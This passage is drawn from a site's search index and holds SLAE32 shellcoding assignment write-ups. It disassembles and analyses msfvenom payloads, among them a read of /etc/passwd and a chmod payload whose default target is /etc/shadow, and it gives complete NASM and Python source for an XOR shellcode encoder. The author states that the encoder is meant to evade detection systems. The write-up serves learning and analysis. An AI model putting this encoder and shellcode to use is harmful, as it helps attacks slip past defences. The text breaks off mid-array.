;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 00000002 B805000000 mov eax,0x5 ; syscall_open() 00000007 5B pop ebx ; #POP. \u0026quot;filename\u0026quot; parameter points to `/etc/passwd` 00000008 31C9 xor ecx,ecx ; \u0026quot;flags\u0026quot; equal to zero. 0000000A CD80 int 0x80 ; call syscall. 0000000C 89C3 mov ebx,eax ; save returned value to ebx. returned value is file handle. ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ; Read File. ; Syscall n°3 (0x3) ; read(unsigned int fd, char *buf, size_t count) ; -- REGISTERS -- ; ebx = File descriptor obtained via \u0026quot;open\u0026quot; syscall. ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 0000000E B803000000 mov eax,0x3 ; syscall_read() 00000013 89E7 mov edi,esp ; copy current stack address to edi register. 00000015 89F9 mov ecx,edi ; copy edi register to ecx register; ; this is where file content will be placed (buff) 00000017 BA00100000 mov edx,0x1000 ; \u0026quot;count\u0026quot; equal to 4096 bytes. Number of bytes to read 0000001C CD80 int 0x80 ; call syscall. 0000001E 89C2 mov edx,eax ; save returned value to ebx. returned value is the number of bytes read. ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ; Write File. ; Syscall n°4 (0x4) ; write(unsigned int fd, const char *buf, size_t count) ; -- REGISTERS -- ; ecx = Stack address used to read file content (\u0026quot;buff\u0026quot;) via \u0026quot;read\u0026quot; syscall. ; edx = bytes read from \u0026quot;read\u0026quot; syscall. ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 00000020 B804000000 mov eax,0x4 ; syscall_write() 00000025 BB01000000 mov ebx,0x1 ; write to file descriptor 0x1 (stdout) 0000002A CD80 int 0x80 ; call syscall. ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ; Exit Gracefully. ; Syscall n°1 (0x1) ; exit(int error_code) ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 0000002C B801000000 mov eax,0x1 ; syscall_exit() 00000031 BB00000000 mov ebx,0x0 ; error_code equal to zero. 00000036 CD80 int 0x80 ; call syscall. ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ; #CALL ; Next address 0x3D is pushed on stack by \u0026quot;call\u0026quot; instruction. ; 0x3D contains target file to read (/etc/passwd) ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; 00000038 E8C5FFFFFF call 0x2 ; Go to 0x00000002 offset. 0000003D 2F das ; / 0000003E 657463 gs jz 0xa4 ; etc 00000041 2F das ; / 00000042 7061 jo 0xa5 ; pa 00000044 7373 jnc 0xb9 ; ss 00000046 7764 ja 0xac ; wd 00000048 00 db 0x00 ; NULL Using static analysis was sufficient to understand every payload actions:\n Use Jump Call Pop technique to get address of target file (/etc/passwd). Open the target file. File handle / descriptor is stored in ebx. Read first 4096 Bytes to stack. Bytes read is stored in edx. Write those 4096 Bytes to file descriptor 0x1. Exit gracefully.  Shellcode N°2 - linux/x86/chmod (GDB) This time, instead of using Ndisasm to conduct a static analysis we will use GDB to understand what next payload is doing.\nGenerate Payload To generate our shellcode, let\u0026rsquo;s first understand which parameters are expected for this payload.\nlocal@user:$ msfvenom -p linux/x86/chmod -a x86 --platform Linux --list-options\nName Current Setting Required Description ---- --------------- -------- ----------- FILE /etc/shadow yes Filename to chmod MODE 0666 yes File mode (octal) Both required parameters are already set. Since we are going to execute this payload we will set FILE to a harmless value.\nWe will create a dummy file:\nlocal@user:$ touch /tmp/test\nThen we will generate our payload and set output format to C.\nlocal@user:$ msfvenom -p linux/x86/chmod -a x86 --platform Linux -f C FILE=/tmp/test\nunsigned char buf[] = \u0026quot;\\x99\\x6a\\x0f\\x58\\x52\\xe8\\x0a\\x00\\x00\\x00\\x2f\\x74\\x6d\\x70\\x2f\u0026quot; \u0026quot;\\x74\\x65\\x73\\x74\\x00\\x5b\\x68\\xb6\\x01\\x00\\x00\\x59\\xcd\\x80\\x6a\u0026quot; \u0026quot;\\x01\\x58\\xcd\\x80\u0026quot;; We will now place this array in our C template for shellcoding.\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; unsigned char buf[] = \u0026quot;\\x99\\x6a\\x0f\\x58\\x52\\xe8\\x0a\\x00\\x00\\x00\\x2f\\x74\\x6d\\x70\\x2f\u0026quot; \u0026quot;\\x74\\x65\\x73\\x74\\x00\\x5b\\x68\\xb6\\x01\\x00\\x00\\x59\\xcd\\x80\\x6a\u0026quot; \u0026quot;\\x01\\x58\\xcd\\x80\u0026quot;; main() { printf(\u0026quot;Shellcode Length: %d\\n\u0026quot;, strlen(buf)); int (*ret)() = (int(*)())buf; ret(); } We can compile our shellcode using the following command:\nlocal@user:$ gcc shellcode.c -o shellcode -z execstack\nAnalyzing Shellcode with GDB local@user:$ gdb ./shellcode\nFirst step is to breakpoint to the shellcode itself.\nGDB\u0026gt; b *\u0026amp;buf\nBreakpoint 1 at 0x2020 We can now run the program\nGDB\u0026gt; r\nGDB will break when it reaches our shellcode location.\nWe can see the assembly code of our shellcode using the disassemble command.\nGDB\u0026gt; disassemble\n=\u0026gt; 0x00402020 \u0026lt;+0\u0026gt;: cdq 0x00402021 \u0026lt;+1\u0026gt;: push 0xf 0x00402023 \u0026lt;+3\u0026gt;: pop eax 0x00402024 \u0026lt;+4\u0026gt;: push edx 0x00402025 \u0026lt;+5\u0026gt;: call 0x402034 \u0026lt;buf+20\u0026gt; 0x0040202a \u0026lt;+10\u0026gt;: das 0x0040202b \u0026lt;+11\u0026gt;: je 0x40209a 0x0040202d \u0026lt;+13\u0026gt;: jo 0x40205e 0x0040202f \u0026lt;+15\u0026gt;: je 0x402096 0x00402031 \u0026lt;+17\u0026gt;: jae 0x4020a7 0x00402033 \u0026lt;+19\u0026gt;: add BYTE PTR [ebx+0x68],bl 0x00402036 \u0026lt;+22\u0026gt;: mov dh,0x1 0x00402038 \u0026lt;+24\u0026gt;: add BYTE PTR [eax],al 0x0040203a \u0026lt;+26\u0026gt;: pop ecx 0x0040203b \u0026lt;+27\u0026gt;: int 0x80 0x0040203d \u0026lt;+29\u0026gt;: push 0x1 0x0040203f \u0026lt;+31\u0026gt;: pop eax 0x00402040 \u0026lt;+32\u0026gt;: int 0x80 0x00402042 \u0026lt;+34\u0026gt;: add BYTE PTR [eax],al At first glance it seems that some instruction are broken.\nLets also dump registers values to trace future changes.\nGDB\u0026gt; info register\neax 0x402020 0x402020 ecx 0x0 0x0 edx 0x40064a 0x40064a ebx 0x401fd4 0x401fd4 esp 0xbfffefbc 0xbfffefbc \u0026lt;...snip...\u0026gt; It is important to monitor registers between each instructions especially when you don\u0026rsquo;t know what a specific instruction is used for.\nLet\u0026rsquo;s continue to next instruction.\nGDB\u0026gt; n\nOur edx register is now equal to zero.\nGDB\u0026gt; print/x $edx\nIt seems that cdq instruction was used to clear the edx register.\nGDB\u0026gt; n\nGDB\u0026gt; n\nGDB\u0026gt; n\nLast three instructions was used to respectively place value 0xf to eax register and push a new zero to the top of the stack.\nInterestingly, the call instruction attempts to reach an invalid instruction location 0x402034.\nLets add a new breakpoint to this address and continue execution.\nGDB\u0026gt;b *0x402034\nGDB\u0026gt;c\nesp register now points to a new location. This is perfectly normal, when call instruction is called, the next instruction offset is pushed on the top of the stack.\nThe next instruction after the call was at offset 0x40202a. This offset contains what seems to be our target file name. We can confirm that using following commands:\nGDB\u0026gt; x/x $esp\n0xbfffefb4: 0x0040202a GDB\u0026gt; x/s *(char**)$esp or x/s 0x40202a\n0x40202a \u0026lt;buf+10\u0026gt;: \u0026quot;/tmp/test\u0026quot; This trick was used to place our target file name in memory and retrieve it location using the call instruction. It is a variant of the Jump Call Pop technique but without the Jump.\nGDB\u0026gt; n\nFile name location was placed on ebx register using the pop instruction.\nGDB\u0026gt; n\nGDB\u0026gt; n\nLast two instructions was used to place on ecx the value 0x1b6\nWe are currently stopped at a syscall call instruction.\n=\u0026gt; 0x40203b \u0026lt;buf+27\u0026gt;: int 0x80 Let\u0026rsquo;s dump our registers\nGDB\u0026gt; info register\neax 0xf 0xf ecx 0x1b6 0x1b6 edx 0x0 0x0 ebx 0x40202a 0x40202a \u0026lt;...snip...\u0026gt;  eax register contains 0xf which is the syscall number of chmod(const char *filename, umode_t mode). ebx register contains 0x40202a which is the address of our file name /etc/test. ecx register contains 0x1b6 which represent the chmod mode 666.  GDB\u0026gt; n\nchmod syscall was successfully triggered, we are sure of that because eax register contains 0x00 which means chmod function succeed.\nWe can verify if our target file permissions have changed:\nGDB\u0026gt; !ls -l /tmp/test\n-rw-rw-rw- 1 phrozen phrozen 0 Jun 9 07:48 /tmp/test GDB\u0026gt; n\nGDB\u0026gt; n\nLast two instructions was used to place on eax the value 0x1\nGDB\u0026gt; n\nWe are currently stopped at a syscall call instruction.\n=\u0026gt; 0x402040 \u0026lt;buf+32\u0026gt;: int 0x80  eax register contains 0x1 which is the syscall number of exit(int error_code)  GDB\u0026gt; n\nWe\u0026rsquo;ve now reached the end of our shellcode and gracefully exit our host program.\nUsing GDB we were able to understand what the actual shellcode was doing, if we had used Ndisasm we would have been confused by the call instruction.\nShellcode N°3 - linux/x86/exec (Libemu) For our last payload we will use Libemu to analyze what our shellcode is doing.\nYou can find instructions about how to download and install Libemu on their official website.\nIn our guest machine, Libemu was installed on /opt/libemu path.\nIn some Linux distributions you may install Libemu via aptitude:\nlocal@user:$ apt install libemu-dev\nGenerate Payload To generate our shellcode, let’s first understand which parameters are expected for this payload.\nlocal@user:$ msfvenom -p linux/x86/exec -a x86 --platform Linux --list-options\nName Current Setting Required Description ---- --------------- -------- ----------- CMD yes The command string to execute Only one parameter is mandatory, the command to execute. We will set /bin/ls as command.\nlocal@user:$ msfvenom -p linux/x86/exec -a x86 --platform Linux CMD=/bin/ls -f raw | /opt/libemu/bin/sctest -vvv -Ss 100000\nAnalyzing Shellcode with Libemu After few seconds we should see the following output\nThis screenshot contains the \u0026ldquo;registry dump\u0026rdquo; after each instructions. This is very useful to trace what the shellcode is doing instruction by instruction.\nAt the end of the analysis, when this is possible, Libemu generate some pseudo-code to have a clear idea of what the shellcode is doing without spending to much time in understanding each assembly instructions.\nint execve ( const char * dateiname = 0x00416fc0 =\u0026gt; = \u0026quot;/bin/sh\u0026quot;; const char * argv[] = [ = 0x00416fb0 =\u0026gt; = 0x00416fc0 =\u0026gt; = \u0026quot;/bin/sh\u0026quot;; = 0x00416fb4 =\u0026gt; = 0x00416fc8 =\u0026gt; = \u0026quot;-c\u0026quot;; = 0x00416fb8 =\u0026gt; = 0x0041701d =\u0026gt; = \u0026quot;/bin/ls\u0026quot;; = 0x00000000 =\u0026gt; none; ]; const char * envp[] = 0x00000000 =\u0026gt; none; ) = 0; From above pseudo-code, it is clear that Libemu has detected that the shellcode was using execve syscall to execute a new command via the /bin/sh program.\nThe full command is: /bin/sh -c \u0026quot;/bin/sh -c /bin/ls\u0026quot;\nWe can even generate a graph of what shellcode is doing in dot format.\nlocal@user:$ msfvenom -p linux/x86/exec -a x86 --platform Linux CMD=/bin/ls -f raw | /opt/libemu/bin/sctest -vvv -Ss 100000 -G exec.dot\nWe can easily convert the dot file format to any compatible image format using the dot utility.\nlocal@user:$ dot exec.dot -Tpng -o exec.png\nThis comes very handy when it comes include further detail in our report analysis.\n"});index.add({'id':9,'href':'/docs/linux/slae32/ex4-encoder/','title':"Assignment N°4 - Encoder (NASM)",'content':"Assignment Goals This paper is part of the certification process following the SLAE32 course (x86 Assembly Language and Shellcoding on Linux) intended to prepare me to become a future certified OSCE.\nIf you are willing to pass the certification I really suggest you to wait until you finished your own certification process before reading that paper.\nWhy? the goal of that certification is to practice and learn how to solve each assignment by yourself. If you read this paper you will get spoiled and seriously oriented to my personal solution and take the risk to abuse of some shortcuts.\nStudent ID: SLAE-1530\n   Create a custom encoding scheme.\n  PoC with using execve-stack as the shellcode.\n  Creating our own encoder Shellcode encoders are useful for two main reasons:\n Minimize the risk of getting cough by detection systems. Avoid bad characters from our original shellcode.  An encoder take a shellcode in input and output a different looking shellcode without affecting it functionality.\nThe main disadvantage with encoding is that your shellcode size will naturally increase.\nEncoder The Encoder is generally created using a high level language such as Python / Ruby or C.\nThe Encoder scramble the shellcode byte by byte using a reversible routine. Depending on the method used, the Encoder could also put effort on avoiding certain bytes we call bad chars.\nWhen the shellcode is completely encoded the encoder wraps it inside another shellcode template called the Decoder.\nDecoder The Decoder reverse the encoding process, When the shellcode is completely decoded, it redirects execution flow at decoded shellcode location.\nXOR Encoder Receipe We will create our custom encoder using XOR encryption.\nEach shellcode byte are XORed using a random byte (0-256), In this case the key is not secret and is required by the decoder.\nXOR key needs to be alternate with the encoded shellcode byte.\nExample:\n0x01 (Shellcode Pos 1) | 0x02 (XOR Key Pos 1) | 0x03 (Shellcode Pos 2) | 0x04 (XOR Key Pos 2) | ...\nThe key length then needs to be equal to the shellcode length thus making the process of limiting bad chars much easier but increasing the size of our final payload by two.\nIndeed, to avoid bad characters, if current XOR key position or if XOR operation result is equal to a defined bad char, we need to change the current key position value until we escape all bad chars.\nDecoder OpCodes (represented by one byte or a couple of bytes) can\u0026rsquo;t be placed in bad chars since they are part of the decoding process. They must be white listed.\nWe also need to take care of modifying few parts of the decoder on the fly.\nSince decoder browse the shellcode byte by byte, it needs to use the ecx register to create a loop. ecx is obviously equal to the size of our shellcode. So we must patch that value dynamically and cleverly.\nIf shellcode length is bellow or equal to 2^8 (256) bytes, then we use cl (8 Bit) register to store loop counter. If shellcode length is above 2^8 and bellow or equal to 2^16 (65535) bytes, then we use cx (16 Bit) register to store loop counter. Finally if shellcode length is above 2^16 and bellow or equal to 2^32 (4294967296) Bytes, then we use ecx (32 Bit) register to store loop counter.\nMost of the time if not always our shellcode wont cross 65535 bytes but just in case size above this limit is supported.\nSince we are changing OpCode on the fly, we must also relocate addresses for some instructions. We also need to carefully take care of that.\nDecoder Template (NASM) ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; ; Filename : xor-encoder.nasm ; ; Author : Jean-Pierre LESUEUR ; ; Website : https://www.phrozen.io/ ; ; Email : jplesueur@phrozen.io ; ; Twitter : @DarkCoderSc ; ; ; ; --------------------------------------------------; ; SLAE32 Certification Assignement N°3 ; ; (Pentester Academy). ; ; https://www.pentesteracademy.com ; ;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;; global _start section .text ;-------------------------------------------------------------------- ; Program Entry Point. ;-------------------------------------------------------------------- _start: jmp short get_shellcode ;-------------------------------------------------------------------- ; Decode shellcode with associated key (XOR Decoder). ;-------------------------------------------------------------------- decoder: pop esi ; Address of EncodedShellcode xor ecx, ecx\t; zero ecx xor eax, eax\t; zero eax xor ebx, ebx ; zero ebx mov cl, 0x1 ; length of our shellcode (EncodedShellcode / 2) decode:\tmov ah, byte [esi + ebx] mov al, byte [esi + ebx +1] xor ah, al mov [esi], ah inc ebx inc esi loop decode jmp short EncodedShellcode ; run our decoded shellcode ;-------------------------------------------------------------------- ; This section contain our encoded shellcode + XOR key. ; It address will be recovered using the Jump Call Pop technique. ;-------------------------------------------------------------------- get_shellcode: call decoder EncodedShellcode: db 0x00, 0x00 Identified White Chars Each OpCode present in this decoder is designated as a whitelisted char. Since it is required for decoding process it can\u0026rsquo;t be avoided.\nTo identify white chars we can compile the Decoder template then use objdump.\nlocal@user:$ nasm -f elf32 -o xor-decoder.o xor-decoder.nasm\nlocal@user:$ ld -o xor-decoder xor-decoder.o\nlocal@users:$ objdump -d xor-decoder -M intel\nxor-decoder: file format elf32-i386 Disassembly of section .text: 08048060 \u0026lt;_start\u0026gt;: 8048060:\teb 1a jmp 804807c \u0026lt;get_shellcode\u0026gt; 08048062 \u0026lt;decoder\u0026gt;: 8048062:\t5e pop esi 8048063:\t31 c9 xor ecx,ecx 8048065:\t31 c0 xor eax,eax 8048067:\t31 db xor ebx,ebx 8048069:\tb1 01 mov cl,0x1 0804806b \u0026lt;decode\u0026gt;: 804806b:\t8a 24 1e mov ah,BYTE PTR [esi+ebx*1] 804806e:\t8a 44 1e 01 mov al,BYTE PTR [esi+ebx*1+0x1] 8048072:\t30 c4 xor ah,al 8048074:\t88 26 mov BYTE PTR [esi],ah 8048076:\t43 inc ebx 8048077:\t46 inc esi 8048078:\te2 f1 loop 804806b \u0026lt;decode\u0026gt; 804807a:\teb 05 jmp 8048081 \u0026lt;EncodedShellcode\u0026gt; 0804807c \u0026lt;get_shellcode\u0026gt;: 804807c:\te8 e1 ff ff ff call 8048062 \u0026lt;decoder\u0026gt; Giving:\n0x01, 0x05, 0x1e, 0x24, 0x26, 0x2e, 0x30, 0x31 0x43, 0x44, 0x46, 0x5e, 0x88, 0x8a, 0xc0, 0xc4 0xc9, 0xdb, 0xe8, 0xeb, 0xf1, 0xff as default white char list.\nRemember, depending on the size of our shellcode, we also need to modify on the fly some OpCodes. Resulting OpCode must be also present in white char list.\nShellcode (\u0026lt;= 2^8) 0xb1, 0x1a Shellcode (\u0026gt; 2^8 and \u0026lt;= 2^16) 0x66, 0xb9, 0x1c, 0xdf Shellcode (\u0026gt; 2^16 and \u0026lt;= 2^32\u0026gt;) 0xb9, 0x1d, 0xde Shellcode Length Bad char subtlety There is a last important thing to take in consideration about bad chars.\nWhen we generate our final decoder payload. We are placing a special OpCode (ecx counter) with the size of our shellcode encoded in hex (Little Endian). This could result in having a new bad char.\nTo avoid this problem, we can add an option to append junk OpCode(s) at the end of the shellcode to encode thus varying it size and then OpCode layout.\nXOR Encoder Code #!/usr/bin/python3 ''' Jean-Pierre LESUEUR (@DarkCoderSc) jplesueur@phrozen.io https://www.phrozen.io/ https://github.com/darkcodersc License : MIT --- SLAE32 Assignment 4 : Linux x86-32 Shellcode Encoder. --- Description: Encode shellcode using XOR. Support shellcode from any size. Support bad chars. ''' import sys import random from textwrap import wrap import argparse ############################################################################################################ verbose = False shellcode = None encoded_shellcode = None ############################################################################################################ # # Define bad characters and white characters. # # white characters are characters used by the decoder itself so it can't be present in bad character array. # ############################################################################################################ # # Bad chars list # default_bad_chars = bytearray([0x00]) bad_chars = None # # Whitelist chars (Can't be in bad chars) # white_chars_base = bytearray([ 0x01, 0x05, 0x1e, 0x24, 0x26, 0x2e, 0x30, 0x31, 0x43, 0x44, 0x46, 0x5e, 0x88, 0x8a, 0xc0, 0xc4, 0xc9, 0xdb, 0xe8, 0xeb, 0xf1, 0xff ]) white_chars_size8 = bytearray([0xb1, 0x1a]) white_chars_size16 = bytearray([0x66, 0xb9, 0x1c, 0xdf]) white_chars_size32 = bytearray([0xb9, 0x1d, 0xde]) white_chars = None ############################################################################################################ # # Utilities Definitions # ############################################################################################################ # # Log Defs # def success(message): print(\u0026quot;[\\033[32m+\\033[39m] \u0026quot; + message) def err(message): print(\u0026quot;[\\033[31m-\\033[39m] \u0026quot; + message) def warn(message): print(\u0026quot;[\\033[33m!\\033[39m] \u0026quot; + message) def info(message): if verbose: print(\u0026quot;[\\033[34m*\\033[39m] \u0026quot; + message) # # Convert Byte Array to Byte String # def bytearr_to_bytestr(data): return ''.join(f\u0026quot;\\\\x{'{:02x}'.format(x)}\u0026quot; for x in data) # # Convert Byte String to Byte Array # def bytestr_to_bytearr(data): return list(bytearray.fromhex(data.replace(\u0026quot;\\\\x\u0026quot;, \u0026quot; \u0026quot;))) ############################################################################################################ # # Prepare Badchar List (Need to be done before calling EncodeShellcode()) # ############################################################################################################ def PrepareBadChars(reg_size): global bad_chars global white_chars result = True\tbad_chars = bytearray() white_chars = bytearray() if argv.badchars_str:\tbad_chars.extend(default_bad_chars) white_chars.extend(white_chars_base) if (reg_size == 8):\twhite_chars.extend(white_chars_size8) elif (reg_size == 16):\twhite_chars.extend(white_chars_size16) elif (reg_size == 32): white_chars.extend(white_chars_size32) for badchar in bytestr_to_bytearr(argv.badchars_str): if (white_chars.find(badchar, 0) == -1): bad_chars.append(badchar) else: warn(f\u0026quot;{hex(badchar)} is whitelisted. It can't be a badchar\u0026quot;) result = False return result ############################################################################################################ # # Encode Shellcode (XOR) Definition # ############################################################################################################ def EncodeShellcode(): global shellcode global encoded_shellcode\t# # Start encoding #\tencoded_shellcode = bytearray()\tfor opcode in shellcode:\tcandidates = random.sample(range(255), 255) found = False for candidate in candidates:\tresult = opcode ^ candidate if (bad_chars.find(result, 0) == -1) and (bad_chars.find(candidate, 0) == -1):\tfound = True break\tif not found: return False encoded_shellcode.append(result) encoded_shellcode.append(candidate) return True ############################################################################################################ # # Program Entry Point # ############################################################################################################ parser = argparse.ArgumentParser(description='Shellcode Xor Encoder (@DarkCoderSc)') parser.add_argument('-s', action=\u0026quot;store\u0026quot;, dest=\u0026quot;shellcode_str\u0026quot;, required=True, help=\u0026quot;Shellcode to encode (Ex: \\\\x31\\\\xe2...\\\\xeb).\u0026quot;) parser.add_argument('-b', action=\u0026quot;store\u0026quot;, dest=\u0026quot;badchars_str\u0026quot;, required=False, help=\u0026quot;Bad chars list (Ex: \\\\x0a\\\\x0d), NULL is always a bad char.\u0026quot;) parser.add_argument('-v', action=\u0026quot;store_true\u0026quot;, default=False, dest=\u0026quot;verbose\u0026quot;, required=False, help=\u0026quot;Enable verbose.\u0026quot;) parser.add_argument('-j', action=\u0026quot;store\u0026quot;, dest=\u0026quot;junk_length\u0026quot;, type=int, default=0, required=False, help=\u0026quot;Append junk opcode at the end of the original shellcode to vary it size.\u0026quot;) parser.add_argument('-p', action=\u0026quot;store_true\u0026quot;, default=False, dest=\u0026quot;paranoid_bcheck\u0026quot;, required=False, help=\u0026quot;Check if final payload is really free of badchars (Paranoid mode).\u0026quot;) try: argv = parser.parse_args() verbose = argv.verbose except IOError: parse.error sys.exit() # # Setup shellcode array # shellcode = bytestr_to_bytearr(argv.shellcode_str) # # Optionnaly append junk data at the end to vary shellcode size and avoid bad chars. # if (argv.junk_length \u0026gt; 0): shellcode.extend(b\u0026quot;\\x90\u0026quot;*argv.junk_length) ############################################################################################################ # # Encode and ajust decoder # (!) Retry encoding until no bad chars are found in generated opcode (during relocation) # ############################################################################################################ shellcode_length = len(shellcode) info(f\u0026quot;{shellcode_length} bytes loaded from shellcode to encode.\u0026quot;) reg_size = 0 if (shellcode_length \u0026lt;= (2**8-1)):\treg_size = 8 elif (shellcode_length \u0026lt;= (2**16-1)): reg_size = 16 elif (shellcode_length \u0026lt;= (2**32-1)): reg_size = 32 if (reg_size == 0): err(\u0026quot;Shellcode length is not compatible with our encoder.\u0026quot;) sys.exit() # # Prepare Badchars # info(\u0026quot;Prepare bad chars list...\u0026quot;) if not PrepareBadChars(reg_size): err(\u0026quot;Invalid badchar, one or multiple badchar are not compatible with our encoder.\u0026quot;) sys.exit() info(\u0026quot;Done.\u0026quot;) # # Encode Shellcode (XOR) # info(\u0026quot;Start shellcode encoding...\u0026quot;) if not EncodeShellcode(): err(\u0026quot;Could not encode shellcode, with current badchar list. Likely reason: to much bad chars.\u0026quot;) sys.exit() info(\u0026quot;Done.\u0026quot;) # # Upgrade ecx counter / jmp / call relocation. #\tif (reg_size == 8):\tcounter_opcode = b\u0026quot;\\xb1\u0026quot; counter_opcode += shellcode_length.to_bytes(1, byteorder=\u0026quot;little\u0026quot;) jmp_get_shellcode_opcode = b\u0026quot;\\x1a\u0026quot; call_decoder_opcode = b\u0026quot;\\xe1\u0026quot; elif (reg_size == 16): counter_opcode = b\u0026quot;\\x66\\xb9\u0026quot; counter_opcode += shellcode_length.to_bytes(2, byteorder=\u0026quot;little\u0026quot;) jmp_get_shellcode_opcode = b\u0026quot;\\x1c\u0026quot; call_decoder_opcode = b\u0026quot;\\xdf\u0026quot; elif (reg_size == 32):\tcounter_opcode = b\u0026quot;\\xb9\u0026quot; counter_opcode += shellcode_length.to_bytes(4, byteorder=\u0026quot;little\u0026quot;)\tjmp_get_shellcode_opcode = b\u0026quot;\\x1d\u0026quot; call_decoder_opcode = b\u0026quot;\\xde\u0026quot;\tinfo(f\u0026quot;counter opcode=[{bytearr_to_bytestr(counter_opcode)}]\u0026quot;) info(f\u0026quot;jmp_get_shellcode opcode=[{bytearr_to_bytestr(jmp_get_shellcode_opcode)}]\u0026quot;) info(f\u0026quot;call_decoder opcode=[{bytearr_to_bytestr(call_decoder_opcode)}]\u0026quot;) info(\u0026quot;Checking if additional opcodes now include bad chars...\u0026quot;) for opcode in counter_opcode:\tif bad_chars.find(opcode) != -1:\terr(f\u0026quot;A badchar \\\u0026quot;{hex(opcode)}\\\u0026quot; was introduced during OpCode generation. Use option \\\u0026quot;-j\\\u0026quot; to vary shellcode length and try again.\u0026quot;) sys.exit() info(\u0026quot;Done.\u0026quot;) ############################################################################################################ # # Build Final Payload # ############################################################################################################ info(\u0026quot;Build our final payload...\u0026quot;) payload = b\u0026quot;\u0026quot; # \u0026lt;_start\u0026gt;: payload += b\u0026quot;\\xeb\u0026quot; payload += jmp_get_shellcode_opcode # jmp \u0026lt;get_shellcode\u0026gt; # \u0026lt;decoder\u0026gt;: payload += b\u0026quot;\\x5e\u0026quot; # pop esi payload += b\u0026quot;\\x31\\xc9\u0026quot; # xor ecx,ecx payload += b\u0026quot;\\x31\\xc0\u0026quot; # xor eax,eax payload += b\u0026quot;\\x31\\xdb\u0026quot; # xor ebx,ebx payload += counter_opcode\t# mov cl|cx|ecx, \u0026lt;EncodedShellcode / 2\u0026gt; # \u0026lt;decode\u0026gt;: payload += b\u0026quot;\\x8a\\x24\\x1e\u0026quot; # mov ah,BYTE PTR [esi+ebx*1] payload += b\u0026quot;\\x8a\\x44\\x1e\\x01\u0026quot; # mov al,BYTE PTR [esi+ebx*1+0x1] payload += b\u0026quot;\\x30\\xc4\u0026quot; # xor ah,al payload += b\u0026quot;\\x88\\x26\u0026quot; # mov BYTE PTR [esi],ah payload += b\u0026quot;\\x43\u0026quot; # inc ebx payload += b\u0026quot;\\x46\u0026quot; # inc esi payload += b\u0026quot;\\xe2\\xf1\u0026quot; # loop \u0026lt;decode\u0026gt; payload += b\u0026quot;\\xeb\\x05\u0026quot; # jmp \u0026lt;EncodedShellcode\u0026gt; # \u0026lt;get_shellcode\u0026gt;: payload += b\u0026quot;\\xe8\u0026quot; payload += call_decoder_opcode # call \u0026lt;decoder\u0026gt; payload += b\u0026quot;\\xff\\xff\\xff\u0026quot; # \u0026lt;EncodedShellcode\u0026gt;: payload += bytes(encoded_shellcode) info(\u0026quot;Done.\u0026quot;) ############################################################################################################ # # Verify if we don't have any badchars (Optional) # Should never occurs, if it occurs it means we have a bug somewhere. # ############################################################################################################ if argv.paranoid_bcheck: for opcode in payload: if bad_chars.find(opcode, 0) != -1: err(\u0026quot;Bad char found in final payload. Possible bug affects our encoder.\u0026quot;) sys.exit() success(\u0026quot;Final payload is completely free of bad chars.\u0026quot;) ############################################################################################################ # # Print C array payload to termina. Ready for use (Copy / Paste) # ############################################################################################################ payload_str = bytearr_to_bytestr(payload) size = int(len(payload_str) / 4) final_payload = \u0026quot;// Shellcode size = {}\\n\u0026quot;.format(size) final_payload += \u0026quot;unsigned char code[] = \\\\\\n\u0026quot; for l in wrap(payload_str, 64): final_payload += \u0026quot;\\t\\\u0026quot;{}\\\u0026quot;\\n\u0026quot;.format(l) final_payload = final_payload[:-1] + \u0026quot;;\u0026quot; print(f\u0026quot;\\n{final_payload}\\n\u0026quot;) success(f\u0026quot;Shellcode successfully encoded, payload size: {size}\u0026quot;) Usage  -s : Shellcode to encode (Ex: \\x31\\xe2\u0026hellip;\\xeb). -b : Bad chars list (Ex: \\x0a\\x0d), NULL is always a bad char.\u0026quot;) -v : Enable verbose. -j : Append junk opcode at the end of the original shellcode to vary it size. -p : Check if final payload is really free of badchars (Paranoid mode).  Example We will use execve-stack as shellcode to encode.\nlocal@user:$ ./xor-encoder.py -s \u0026quot;\\xeb\\x1a\\x5e\\x31\\xdb\\x88\\x5e\\x07\\x89\\x76\\x08\\x89\\x5e\\x0c\\x8d\\x1e\\x8d\\x4e\\x08\\x8d\\x56\\x0c\\x31\\xc0\\xb0\\x0b\\xcd\\x80\\xe8\\xe1\\xff\\xff\\xff\\x2f\\x62\\x69\\x6e\\x2f\\x73\\x68\\x41\\x42\\x42\\x42\\x42\\x43\\x43\\x43\\x43\u0026quot; -b \u0026quot;\\x0a\\x0d\u0026quot; -v -p\nTest encoded shellcode #include\u0026lt;stdio.h\u0026gt; #include\u0026lt;string.h\u0026gt; // Shellcode size = 131 unsigned char code[] = \\ \u0026quot;\\xeb\\x1a\\x5e\\x31\\xc9\\x31\\xc0\\x31\\xdb\\xb1\\x31\\x8a\\x24\\x1e\\x8a\\x44\u0026quot; \u0026quot;\\x1e\\x01\\x30\\xc4\\x88\\x26\\x43\\x46\\xe2\\xf1\\xeb\\x05\\xe8\\xe1\\xff\\xff\u0026quot; \u0026quot;\\xff\\xbf\\x54\\xd4\\xce\\x7c\\x22\\x0c\\x3d\\x5d\\x86\\x94\\x1c\\x5b\\x05\\xd9\u0026quot; 